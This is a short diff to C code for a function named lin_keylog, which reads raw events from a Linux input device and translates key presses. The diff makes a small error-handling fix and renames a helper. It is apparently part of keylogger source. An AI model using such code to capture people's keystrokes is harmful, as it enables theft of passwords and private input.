@@ -105,7 +105,7 @@ void lin_keylog(const char* filePath) {
     int fd = open(device, O_RDONLY);
     if (fd < 0) {
         perror("Failed to open input device");
-        return 1;
+        exit(EXIT_FAILURE);
     }
 
     struct input_event ev;
@@ -117,7 +117,7 @@ void lin_keylog(const char* filePath) {
         if (bytes < 0) continue;
 
         if (ev.type == EV_KEY) {
-            update_modifier_state(ev.code, ev.value);
+            update_modifier_keys(ev.code, ev.value);
 
             if (ev.value == 1) { // key press
                 const char* key = translate_key(ev.code);
